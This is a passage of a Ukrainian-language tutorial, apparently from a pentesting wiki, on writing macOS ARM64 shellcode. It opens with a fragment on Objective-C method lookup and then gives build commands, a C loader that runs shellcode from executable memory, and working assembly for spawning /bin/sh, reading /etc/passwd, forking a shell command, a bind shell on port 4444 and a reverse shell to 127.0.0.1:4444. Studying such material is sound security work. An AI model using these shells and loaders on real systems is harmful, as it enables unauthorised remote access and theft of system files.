- Перевірити cache superclass:
- Якщо успішно, завершити
- Перевірити список methods superclass:
- Якщо знайдено, заповнити cache і завершити
- Якщо (resolver), спробувати method resolver і повторити з class lookup
- Якщо виконання все ще тут (= усе інше завершилося невдачею), спробувати forwarder

### Shellcodes

Для компіляції:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Щоб витягти байти:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Для новіших версій macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```

```c
#include <stdio.h>

#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```

```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```

#### Читання за допомогою cat

Мета полягає у виконанні `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, тому другий аргумент (x1) є масивом параметрів (у пам’яті це означає стек адрес).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Виконати команду через sh із fork, щоб основний процес не було завершено
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell з [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) на **порту 4444**<sup>[[2]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

З [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell на **127.0.0.1:4444**<sup>[[3]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
